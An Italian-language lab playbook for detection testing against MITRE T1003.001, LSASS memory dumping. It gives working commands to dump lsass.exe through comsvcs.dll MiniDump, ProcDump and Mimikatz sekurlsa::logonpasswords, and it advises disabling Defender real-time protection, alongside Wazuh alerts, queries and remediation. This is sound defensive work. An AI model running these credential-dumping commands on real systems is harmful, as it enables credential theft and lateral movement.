# Playbook — T1003.001: LSASS Memory Dumping (Mimikatz & co.)

## Metadati

| Campo | Valore |
|---|---|
| MITRE Technique | [T1003.001 — OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/) |
| Tactic | Credential Access |
| Platform | Windows |
| VM | `target-windows` |
| Prerequisiti | Sysmon installato (EID 1 + EID 10), Wazuh Agent attivo, PowerShell admin |
| Detection rule | `custom_windows.xml` — 100025 (EID 10), 100033 (dump cmd), 100034 (Mimikatz) |
| Severity attesa | Critical (level 14–15) |

---

## Obiettivo

`lsass.exe` (Local Security Authority Subsystem Service) tiene in memoria credenziali, hash NTLM e
ticket Kerberos degli utenti loggati. Dumparne la memoria è **la** tecnica di Credential Access più
usata da attaccanti e ransomware operator. Qui la simuliamo con metodi reali (procdump, LOLBin
`comsvcs.dll`, Mimikatz) per innescare le regole 100025/100033/100034.

> ⚠️ Eseguire **solo dentro la VM isolata** `target-windows`. Il dump di LSASS estrae credenziali:
> in lab ci sono solo account fittizi, ma è una tecnica reale — non farla su sistemi di produzione.

---

## Prerequisiti

```powershell
# PowerShell come amministratore nella VM
Get-Service Sysmon64, WazuhSvc   # entrambi Running
# Abilita SeDebugPrivilege e' implicito per admin; LSASS dump richiede privilegi elevati
```

I metodi 1–2 non richiedono tool esterni. Il metodo 3 (Mimikatz) è il più "rumoroso" e riconoscibile.

---

## Simulazione

### Metodo 1 — comsvcs.dll MiniDump (LOLBin, nessun tool esterno) ⭐

Il binario di sistema `comsvcs.dll` espone la funzione `MiniDump` richiamabile via `rundll32`.
È il metodo "living off the land" più usato perché non porta file estranei.

```powershell
# Trova il PID di lsass
$lsass = (Get-Process lsass).Id
# Dump della memoria via comsvcs.dll
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass C:\Windows\Temp\lsass.dmp full
```

> Trigger: regola **100033** (pattern `comsvcs.dll ... MiniDump`) + **100025** (accesso a lsass).

### Metodo 2 — ProcDump (Sysinternals)

```powershell
# Scarica ProcDump
Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\pd.zip"
Expand-Archive "$env:TEMP\pd.zip" "$env:TEMP\pd" -Force
# Dump completo di lsass
& "$env:TEMP\pd\procdump64.exe" -accepteula -ma lsass.exe C:\Windows\Temp\lsass_pd.dmp
```

> Trigger: regola **100033** (`procdump ... lsass` / `-ma lsass`) + **100025**.

### Metodo 3 — Mimikatz (il classico)

```powershell
# Scarica Mimikatz (release ufficiale gpcat/gentilkiwi)
Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" -OutFile "$env:TEMP\mk.zip"
Expand-Archive "$env:TEMP\mk.zip" "$env:TEMP\mk" -Force
# Estrai le credenziali dalla memoria
& "$env:TEMP\mk\x64\mimikatz.exe" "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

> Trigger: regola **100034** (keyword `sekurlsa::`, `logonpasswords`, `privilege::debug`).
> Nota: Windows Defender bloccherà mimikatz.exe se attivo — disabilita la real-time protection
> nella VM **solo per il test** (genera anche l'alert T1562.001, vedi attack chain), oppure usa i
> Metodi 1–2 che non vengono flaggati come malware.

### Metodo 4 — Atomic Red Team

```powershell
Import-Module Invoke-AtomicRedTeam
Invoke-AtomicTest T1003.001 -TestNumbers 1,2,3
```

---

## Alert atteso su Wazuh

```
rule.id: 100033        rule.level: 14
rule.description: "[T1003.001] LSASS memory dump command detected: ..."
rule.mitre.id: ["T1003","T1003.001"]
agent.name: target-windows
data.win.eventdata.commandLine: "rundll32 ... comsvcs.dll, MiniDump ... lsass ..."
```

Per Mimikatz: `rule.id: 100034`, level 15, keyword `sekurlsa::logonpasswords`.
Per accesso diretto alla memoria (Sysmon EID 10): `rule.id: 100025`, sourceImage = il tool, targetImage = `lsass.exe`.

---

## Come verificare la detection

```
agent.name: "target-windows" AND rule.id: (100025 OR 100033 OR 100034)
```
```
rule.mitre.technique: "LSASS Memory"
```

Event Viewer (VM): **Sysmon/Operational** → Event ID **10** (ProcessAccess) con `TargetImage` =
`lsass.exe` e `GrantedAccess` ad alto privilegio (`0x1010`, `0x1410`, `0x1fffff`).

---

## Verifica True Positive vs False Positive

| Indicatore | True Positive | False Positive |
|---|---|---|
| Processo che accede a lsass | procdump, rundll32, powershell, tool sconosciuti | EDR/AV legittimo, MsMpEng.exe |
| GrantedAccess | `0x1010`/`0x1fffff` (read memory) | accessi a basso privilegio |
| Command line | `comsvcs MiniDump`, `-ma lsass`, `sekurlsa` | — |
| File creato | `lsass.dmp` in Temp/path insolito | — |

---

## Cleanup

```powershell
Remove-Item C:\Windows\Temp\lsass*.dmp -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\pd","$env:TEMP\mk","$env:TEMP\pd.zip","$env:TEMP\mk.zip" -Recurse -Force -ErrorAction SilentlyContinue
# Riabilita Defender se l'avevi disattivato per Mimikatz
Set-MpPreference -DisableRealtimeMonitoring $false
```

---

## Remediation

1. **Credential Guard** (VBS) per isolare i segreti LSASS dalla memoria accessibile.
2. **RunAsPPL**: proteggi LSASS come *Protected Process Light* (`RunAsPPL=1` nel registro).
3. **Attack Surface Reduction**: regola ASR "Block credential stealing from lsass.exe".
4. Monitora **Sysmon EID 10** verso `lsass.exe` con GrantedAccess sospetto (questa regola).
5. Limita i diritti di amministratore locale (un dump richiede privilegi elevati).
